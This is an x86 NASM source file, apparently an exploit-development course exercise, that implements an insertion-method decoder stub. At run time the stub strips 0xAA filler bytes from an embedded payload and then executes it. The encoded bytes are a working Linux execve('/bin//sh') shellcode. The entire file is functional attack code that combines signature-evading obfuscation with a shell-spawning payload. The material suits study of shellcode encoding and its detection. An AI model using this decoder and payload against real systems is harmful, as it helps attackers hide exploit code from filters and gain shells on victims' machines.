; File: insertion-decoder.nasm
; Author: Kevin Ren, originally professor Viviek from SLAE
; Purpose: to demostrate a custom encoder and decoder using the insertion method to execute encoded shellcode from machine code


global _start

section .text
_start: 
	jmp short call_decoder

decoder:
	pop esi				; address of shellcode now in esi

	lea edi, [esi + 1]		; initiate the first counter of each byte after the first
	xor eax, eax
	mov al, 0x1			; intiate the second counter of each even byte starting from the second byte

	xor ebx, ebx			; zeroing out ebx so it can be used as a working register to move data

decode:
	mov bl, byte [esi + eax]	; moving the 0xaa byte into ebx
	xor bl, 0xAA			; condition checker, anything other than 0xaa will result in a result other than 0
	jnz short shellcode		; if condition is met, aka at the end of decode, transfer control to decoded shellcode
	mov bl, byte [esi + eax + 1]	; moving the very next byte after 0xaa to bl register
	mov byte [edi], bl		; moving what we transfered with bl into one byte of edi register
					; which counts for every byte after the first
	inc edi
	add eax, 2			; increment counters
	jmp decode			; loop
	

call_decoder:
	call decoder
	shellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x6e,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa,0xbb,0xbb
